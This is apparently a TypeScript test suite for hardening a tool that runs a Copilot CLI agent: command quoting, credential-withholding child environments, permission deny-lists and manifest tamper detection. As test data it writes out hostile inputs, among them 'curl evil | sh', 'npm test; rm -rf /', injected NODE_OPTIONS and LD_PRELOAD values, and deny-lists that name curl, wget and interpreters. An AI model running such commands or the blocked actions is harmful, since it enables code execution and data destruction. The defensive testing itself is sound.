import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { buildCmdLine, cmdExeInvocation, quoteForCmd, UnsafeCommandError } from '../src/util/winCommand.js';
import { buildChildEnv, __testing as envTesting } from '../src/copilot/childEnv.js';
import { diffManifests, fingerprintManifests, referencedScripts } from '../src/verify/integrity.js';
import { acquireLock, isProcessAlive } from '../src/core/lock.js';
import { openDatabase } from '../src/db/database.js';
import { TaskRepository } from '../src/db/taskRepository.js';
import { ProjectRegistry, ProjectRegistryError, realPath } from '../src/projects/registry.js';
import { buildCopilotArgs, MIN_CLI_CREDIT_LIMIT } from '../src/copilot/executor.js';
import { buildPermissionPolicy, DEFAULT_DENIED_URLS, DEFAULT_DENIED_WRITES } from '../src/copilot/permissions.js';
import { mergeUsage, normaliseShutdownUsage } from '../src/copilot/events.js';
import { execCommand } from '../src/util/exec.js';
import { clearRegisteredSecrets, redact } from '../src/core/redact.js';

function tmpDir(tag: string): string {
  const dir = path.join(os.tmpdir(), `rpca-${tag}-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

describe('windows command quoting', () => {
  test('quotes tokens containing shell metacharacters', () => {
    assert.equal(quoteForCmd('C:\\dev\\R&D\\app'), '"C:\\dev\\R&D\\app"');
    assert.equal(quoteForCmd('a b'), '"a b"');
  });

  test('rejects tokens that could escape the quoted region', () => {
    for (const bad of ['a"b', 'a%PATH%b', 'a\nb', 'a\r']) {
      assert.throws(() => quoteForCmd(bad), UnsafeCommandError, bad);
    }
  });

  test('a project path containing & cannot inject a second command', () => {
    const line = buildCmdLine('C:\\dev\\R&D\\gradlew.bat', ['test']);
    assert.equal(line, '"C:\\dev\\R&D\\gradlew.bat" test');
    // The & is inside quotes, so cmd.exe treats it as a literal character.
    assert.ok(!/(^|[^"])&/.test(line.replace(/"[^"]*"/g, '')));
  });

  test('a bare program name is NOT quoted, so .cmd shims resolve %~dp0 correctly', () => {
    // Regression: `cmd /c ""npm" "test""` sets %0 to the quoted bare name, so
    // %~dp0 inside npm.cmd expanded to the project directory and npm died with
    // "Cannot find module <cwd>\node_modules\npm\bin\npm-prefix.js". Every
    // verification using npm/yarn/pnpm/gradlew then failed and good work was
    // discarded. The program token must stay bare when it needs no quoting.
    assert.equal(buildCmdLine('npm', ['test']), 'npm test');
    assert.equal(buildCmdLine('npm', ['run', 'build']), 'npm run build');
    assert.equal(cmdExeInvocation('npm', ['test']).args[3], '"npm test"');
  });

  test('tokens needing quotes are still quoted', () => {
    assert.equal(buildCmdLine('npm', ['run', 'build all']), 'npm run "build all"');
    assert.equal(buildCmdLine('C:\\Program Files\\x\\y.exe', []), '"C:\\Program Files\\x\\y.exe"');
    for (const meta of ['a&b', 'a|b', 'a>b', 'a<b', 'a^b', 'a(b', 'a;b', 'a,b', 'a b', 'a!b']) {
      assert.match(buildCmdLine('tool', [meta]), /^tool "/, `${meta} must be quoted`);
    }
  });

  test('wraps the whole line so cmd /s strips the wrapper, not our quotes', () => {
    const invocation = cmdExeInvocation('C:\\Program Files\\n\\node.exe', ['a b']);
    assert.deepEqual(invocation.args.slice(0, 3), ['/d', '/s', '/c']);
    assert.equal(invocation.args[3], '""C:\\Program Files\\n\\node.exe" "a b""');
  });

  test('escapes a trailing backslash so it cannot escape the closing quote', () => {
    assert.equal(quoteForCmd('C:\\dir\\'), '"C:\\dir\\\\"');
  });

  test('execCommand can really run a .cmd shim (npm) end to end', async (t) => {
    if (process.platform !== 'win32') return t.skip('windows-only');
    const dir = tmpDir('npm-shim');
    fs.writeFileSync(
      path.join(dir, 'package.json'),
      JSON.stringify({ name: 'shim-probe', private: true, scripts: { test: 'node -e "console.log(42)"' } }),
    );
    const result = await execCommand('npm', ['test', '--silent'], { cwd: dir, shell: true, timeoutMs: 120_000 });
    assert.equal(result.code, 0, `npm must actually run; stderr:\n${result.stderr}`);
    assert.match(result.stdout, /42/);
    assert.doesNotMatch(result.stderr, /npm-prefix\.js/, 'the %~dp0 bug must not come back');
  });

  test('execCommand refuses an unsafe command instead of running it', async () => {
    const dir = tmpDir('unsafe');
    const result = await execCommand('echo', ['a"b'], { cwd: dir, shell: true, timeoutMs: 5_000 });
    if (process.platform === 'win32') {
      assert.equal(result.code, null);
      assert.match(result.stderr, /Refusing to run a command/);
    }
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('copilot child environment', () => {
  test('forwards toolchain essentials', () => {
    const env = buildChildEnv({ PATH: '/usr/bin', NODE_ENV: 'test', JAVA_HOME: '/jdk' });
    assert.equal(env.PATH, '/usr/bin');
    assert.equal(env.NODE_ENV, 'test');
    assert.equal(env.JAVA_HOME, '/jdk');
  });

  test('withholds credentials even when they look like toolchain variables', () => {
    const env = buildChildEnv({
      GITHUB_TOKEN: 'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
      AWS_SECRET_ACCESS_KEY: 'abc',
      NPM_TOKEN: 'npm_xxxxxxxxxxxxxxxxxxxx',
      OPENAI_API_KEY: 'sk-zzzzzzzzzzzzzzzzzzzz',
      TELEGRAM_BOT_TOKEN: '123:abc',
      NODE_AUTH_TOKEN: 'nope',
    });
    for (const name of [
      'GITHUB_TOKEN',
      'AWS_SECRET_ACCESS_KEY',
      'NPM_TOKEN',
      'OPENAI_API_KEY',
      'TELEGRAM_BOT_TOKEN',
      'NODE_AUTH_TOKEN',
    ]) {
      assert.equal(env[name], undefined, `${name} must not reach the agent`);
    }
  });

  test('drops unknown variables rather than forwarding them (allow-list, not deny-list)', () => {
    const env = buildChildEnv({ SOME_INTERNAL_THING: 'x', COPILOT_AGENT: '1' });
    assert.equal(env.SOME_INTERNAL_THING, undefined);
    assert.equal(env.COPILOT_AGENT, undefined, 'editor-injected values must not steer the CLI');
  });

  test('registers withheld credentials so they can never be echoed', () => {
    clearRegisteredSecrets();
    buildChildEnv({ MY_SERVICE_TOKEN: 'super-secret-value-1234' });
    assert.ok(!redact('leaked super-secret-value-1234').includes('super-secret-value-1234'));
    clearRegisteredSecrets();
  });

  test('marks CI and disables colour for deterministic output', () => {
    const env = buildChildEnv({});
    assert.equal(env.CI, '1');
    assert.equal(env.NO_COLOR, '1');
  });

  test('classifies names correctly', () => {
    assert.equal(envTesting.isAllowed('PATH'), true);
    assert.equal(envTesting.isAllowed('GITHUB_TOKEN'), false);
    assert.equal(envTesting.isAllowed('CARGO_HOME'), true);
    assert.equal(envTesting.isAllowed('RANDOM_VAR'), false);
  });

  test('withholds variables that inject code into a child process', () => {
    // These all match a toolchain prefix, so they must be denied explicitly.
    const injectors = {
      NODE_OPTIONS: '--require C:\\evil.js',
      PYTHONSTARTUP: '/tmp/evil.py',
      PYTHONPATH: '/tmp/evil',
      JAVA_TOOL_OPTIONS: '-javaagent:/tmp/evil.jar',
      _JAVA_OPTIONS: '-javaagent:/tmp/evil.jar',
      MAVEN_OPTS: '-javaagent:/tmp/evil.jar',
      GRADLE_OPTS: '-javaagent:/tmp/evil.jar',
      LD_PRELOAD: '/tmp/evil.so',
      BASH_ENV: '/tmp/evil.sh',
    };
    const env = buildChildEnv(injectors);
    for (const name of Object.keys(injectors)) {
      assert.equal(env[name], undefined, `${name} is a code-injection vector and must not be forwarded`);
    }
  });

  test('an explicit passthrough can re-enable one variable when a build needs it', () => {
    const env = buildChildEnv({ NODE_OPTIONS: '--max-old-space-size=4096' }, { passthrough: ['NODE_OPTIONS'] });
    assert.equal(env.NODE_OPTIONS, '--max-old-space-size=4096');
  });
});

describe('permission policy hardening', () => {
  const policy = buildPermissionPolicy({ allowedUrls: ['github.com'], extraDeniedCommands: [], extraDirs: [] });

  test('denies interpreters, without which the deny-list is decorative', () => {
    for (const interpreter of ['node', 'python', 'python3', 'bash', 'sh', 'powershell', 'pwsh', 'cmd', 'perl', 'ruby']) {
      assert.ok(
        policy.args.includes(`--deny-tool=shell(${interpreter})`),
        `${interpreter} must be denied — it can perform any denied action directly`,
      );
    }
  });

  test('denies network fetch tools used for exfiltration and remote code', () => {
    for (const tool of ['curl', 'wget', 'Invoke-WebRequest', 'iwr', 'irm']) {
      assert.ok(policy.args.includes(`--deny-tool=shell(${tool})`), tool);
    }
  });

  test('denies PowerShell write aliases as well as POSIX ones', () => {
    for (const alias of ['Remove-Item', 'ri', 'Set-Content', 'Add-Content', 'Out-File', 'Move-Item']) {
      assert.ok(policy.args.includes(`--deny-tool=shell(${alias})`), alias);
    }
  });

  test('denies writes to credential files', () => {
    for (const file of DEFAULT_DENIED_WRITES) {
      assert.ok(policy.args.includes(`--deny-tool=write(${file})`), file);
    }
    assert.ok(policy.args.includes('--deny-tool=write(.env)'));
  });

  test('denies writable GitHub endpoints even though github.com is allowed', () => {
    for (const url of DEFAULT_DENIED_URLS) {
      assert.ok(policy.args.includes(`--deny-url=${url}`), url);
    }
    assert.ok(policy.args.includes('--deny-url=https://gist.github.com'));
  });

  test('emits denies before allows so precedence is unambiguous', () => {
    const firstAllow = policy.args.findIndex((a) => a.startsWith('--allow-url='));
    const lastDeny = policy.args.map((a) => a.startsWith('--deny-url=')).lastIndexOf(true);
    assert.ok(lastDeny < firstAllow);
  });

  test('still never grants blanket permissions', () => {
    for (const flag of ['--yolo', '--allow-all', '--allow-all-paths', '--allow-all-urls']) {
      assert.ok(!policy.args.includes(flag), flag);
    }
  });
});

describe('copilot argument construction (1.0.79)', () => {
  const base = {
    launcher: { command: 'node', baseArgs: [], description: 'node', safe: true },
    cwd: '/tmp/p',
    prompt: 'x',
    model: 'claude-opus-5',
    effort: null,
    agent: null,
    autopilot: false,
    maxAutopilotContinues: 5,
    permissionArgs: [],
    timeoutMs: 1000,
    maxTurns: 10,
    creditBudget: 10,
  };

  test('passes --max-ai-credits when the budget meets the CLI minimum', () => {
    const args = buildCopilotArgs({ ...base, creditBudget: MIN_CLI_CREDIT_LIMIT });
    assert.equal(args[args.indexOf('--max-ai-credits') + 1], String(MIN_CLI_CREDIT_LIMIT));
  });

  test('omits --max-ai-credits below the CLI minimum (the CLI would reject it)', () => {
    const args = buildCopilotArgs({ ...base, creditBudget: 10 });
    assert.ok(!args.includes('--max-ai-credits'));
  });

  test('enables the sandbox only when requested', () => {
    assert.ok(!buildCopilotArgs(base).includes('--sandbox'));
    const sandboxed = buildCopilotArgs({ ...base, sandbox: true });
    assert.ok(sandboxed.includes('--sandbox'));
    assert.ok(sandboxed.includes('--experimental'), 'sandbox is gated behind experimental');
  });
});

describe('usage accounting resilience', () => {
  test('reads totals from session.shutdown when result is absent', () => {
    const usage = normaliseShutdownUsage({
      totalPremiumRequests: 0.33,
      codeChanges: { linesAdded: 1, linesRemoved: 1, filesModified: ['a.ts'] },
    });
    assert.equal(usage.premiumRequests, 0.33);
    assert.deepEqual(usage.codeChanges?.filesModified, ['a.ts']);
  });

  test('falls back to nano-AIU when premium requests are absent', () => {
    const usage = normaliseShutdownUsage({ totalNanoAiu: 3_241_350_000 });
    assert.ok(Math.abs((usage.premiumRequests ?? 0) - 3.24135) < 1e-6);
  });

  test('merging never lowers a reported cost', () => {
    const merged = mergeUsage({ premiumRequests: 2 }, { premiumRequests: 1 });
    assert.equal(merged.premiumRequests, 2);
  });

  test('merging unions the changed-file list', () => {
    const merged = mergeUsage(
      { codeChanges: { filesModified: ['a'] } },
      { codeChanges: { filesModified: ['b'] } },
    );
    assert.deepEqual(merged.codeChanges?.filesModified?.sort(), ['a', 'b']);
  });
});

describe('build manifest integrity', () => {
  test('detects a rewritten test script', () => {
    const dir = tmpDir('manifest');
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'jest' } }));
    const before = fingerprintManifests(dir);

    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }));
    const diff = diffManifests(before, fingerprintManifests(dir));

    assert.equal(diff.any, true);
    assert.deepEqual(diff.changed, ['package.json']);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('detects a newly added Makefile', () => {
    const dir = tmpDir('manifest2');
    const before = fingerprintManifests(dir);
    fs.writeFileSync(path.join(dir, 'Makefile'), 'test:\n\techo pwned\n');
    const diff = diffManifests(before, fingerprintManifests(dir));
    assert.deepEqual(diff.added, ['Makefile']);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('reports no change when the agent only edits source files', () => {
    const dir = tmpDir('manifest3');
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'jest' } }));
    const before = fingerprintManifests(dir);
    fs.writeFileSync(path.join(dir, 'app.js'), 'console.log(1)');
    assert.equal(diffManifests(before, fingerprintManifests(dir)).any, false);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('detects a rewritten test-runner config', () => {
    const dir = tmpDir('manifest4');
    fs.writeFileSync(path.join(dir, 'vitest.config.ts'), 'export default {}');
    const before = fingerprintManifests(dir);
    fs.writeFileSync(path.join(dir, 'vitest.config.ts'), 'export default { globalSetup: "./pwn.js" }');
    assert.deepEqual(diffManifests(before, fingerprintManifests(dir)).changed, ['vitest.config.ts']);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test("detects a change to the command's own entry script", () => {
    const dir = tmpDir('manifest5');
    fs.writeFileSync(path.join(dir, 'run-tests.mjs'), 'process.exit(0)');
    const extra = referencedScripts(['run-tests.mjs']);
    assert.deepEqual(extra, ['run-tests.mjs']);

    const before = fingerprintManifests(dir, extra);
    fs.writeFileSync(path.join(dir, 'run-tests.mjs'), 'require("fs").writeFileSync("PWNED","1")');
    assert.deepEqual(diffManifests(before, fingerprintManifests(dir, extra)).changed, ['run-tests.mjs']);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('referencedScripts ignores flags and refuses to escape the project', () => {
    assert.deepEqual(referencedScripts(['--test', 'a.mjs']), ['a.mjs']);
    assert.deepEqual(referencedScripts(['../outside.js']), []);
    assert.deepEqual(referencedScripts(['C:\\abs\\x.js']), []);
    assert.deepEqual(referencedScripts(['run']), []);
  });
});

describe('single-instance lock', () => {
  test('acquires when free and reports the holder when taken', () => {
    const dir = tmpDir('lock');
    const file = path.join(dir, 'agent.pid');

    const first = acquireLock(file);
    assert.equal(first.acquired, true);

    const second = acquireLock(file);
    assert.equal(second.acquired, false);
    assert.equal(second.heldBy?.pid, process.pid);

    first.release();
    assert.equal(acquireLock(file).acquired, true);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('reclaims a stale lock whose pid belongs to a different program', () => {
    const dir = tmpDir('lock2');
    const file = path.join(dir, 'agent.pid');
    // Our own live pid, but recorded against a different executable — exactly
    // what a recycled pid looks like after a power cut.
    fs.writeFileSync(file, JSON.stringify({ pid: process.pid, startedAt: 1, exec: 'C:\\other\\thing.exe' }));

    assert.equal(acquireLock(file).acquired, true, 'must not refuse to start forever');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('reclaims a lock held by a dead process', () => {
    const dir = tmpDir('lock3');
    const file = path.join(dir, 'agent.pid');
    fs.writeFileSync(file, JSON.stringify({ pid: 999_999_998, startedAt: 1, exec: process.execPath }));
    assert.equal(acquireLock(file).acquired, true);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('understands the legacy bare-pid file format', () => {
    const dir = tmpDir('lock4');
    const file = path.join(dir, 'agent.pid');
    fs.writeFileSync(file, String(process.pid));
    assert.equal(acquireLock(file).acquired, false);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('does not consider absurd pids alive', () => {
    assert.equal(isProcessAlive(0), false);
    assert.equal(isProcessAlive(-1), false);
  });
});

describe('database retention and integrity', () => {
  function repo() {
    const db = openDatabase(':memory:');
    return { db, tasks: new TaskRepository(db) };
  }

  const NEW_TASK = {
    userId: 1,
    chatId: 1,
    projectId: 'demo',
    prompt: 'p',
    approvalRequired: false,
    approvalReason: null,
  };

  test('serialises tasks per project so two never share a working tree', () => {
    const { db, tasks } = repo();
    tasks.create(NEW_TASK);
    tasks.create(NEW_TASK);

    const first = tasks.claimNextQueued(1);
    assert.ok(first);
    const second = tasks.claimNextQueued(1, [first!.projectId]);
    assert.equal(second, null, 'a busy project must not be claimed again');
    db.close();
  });

  test('still claims a different project while one is busy', () => {
    const { db, tasks } = repo();
    tasks.create(NEW_TASK);
    tasks.create({ ...NEW_TASK, projectId: 'other' });

    const first = tasks.claimNextQueued(1);
    const second = tasks.claimNextQueued(1, [first!.projectId]);
    assert.equal(second?.projectId, 'other');
    db.close();
  });

  test('finds tasks stranded in WAITING_APPROVAL by a restart', () => {
    const { db, tasks } = repo();
    tasks.create({ ...NEW_TASK, approvalRequired: true, approvalReason: 'risky' });
    assert.equal(tasks.pendingApprovals().length, 1);
    db.close();
  });

  test('prunes old history but keeps recent work', () => {
    const { db, tasks } = repo();
    const task = tasks.create(NEW_TASK);
    tasks.transition(task.id, 'RUNNING');
    tasks.transition(task.id, 'COMPLETED');

    tasks.pruneHistory({ taskMaxAgeMs: -5_000, eventMaxAgeMs: -5_000, usageMaxAgeMs: -5_000 });
    assert.equal(tasks.get(task.id), null, 'old terminal tasks are removed');

    const fresh = tasks.create(NEW_TASK);
    tasks.pruneHistory();
    assert.ok(tasks.get(fresh.id), 'recent tasks survive');
    db.close();
  });

  test('a duplicate update is reported, but a real DB error is not swallowed', () => {
    const { db, tasks } = repo();
    assert.equal(tasks.markUpdateProcessed(7), true);
    assert.equal(tasks.markUpdateProcessed(7), false);
    db.close();
    // With the database closed this must throw rather than silently claim
    // "duplicate", which would drop every incoming update.
    assert.throws(() => tasks.markUpdateProcessed(8));
  });
});

describe('project registry containment', () => {
  test('rejects UNC and extended-length paths', () => {
    const registry = new ProjectRegistry(':memory:');
    for (const bad of ['\\\\server\\share\\proj', '\\\\?\\C:\\proj']) {
      assert.throws(() => registry.add({ id: 'x', name: 'x', path: bad }), ProjectRegistryError, bad);
    }
  });

  test('rejects 8.3 short-name spellings that bypass normalisation', () => {
    const registry = new ProjectRegistry(':memory:');
    assert.throws(
      () => registry.add({ id: 'x', name: 'x', path: 'C:\\PROGRA~1\\thing' }),
      ProjectRegistryError,
    );
  });

  test('rejects shell metacharacters in operator-configured commands', () => {
    const dir = tmpDir('cmd');
    for (const bad of ['npm test & calc', 'npm test | evil', 'npm test; rm -rf /', 'npm test `id`']) {
      assert.throws(
        () => ProjectRegistry.fromRecords([{ id: 'p', name: 'p', path: dir, testCommand: bad }]),
        ProjectRegistryError,
        bad,
      );
    }
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('accepts an ordinary command with arguments', () => {
    const dir = tmpDir('cmd2');
    const registry = ProjectRegistry.fromRecords([
      { id: 'p', name: 'p', path: dir, testCommand: 'npm run test:ci -- --bail' },
    ]);
    assert.equal(registry.getById('p')?.testCommand, 'npm run test:ci -- --bail');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('realPath canonicalises even for a not-yet-created child', () => {
    const dir = tmpDir('real');
    const child = path.join(dir, 'does-not-exist-yet');
    assert.equal(realPath(child), path.join(realPath(dir), 'does-not-exist-yet'));
    fs.rmSync(dir, { recursive: true, force: true });
  });
});
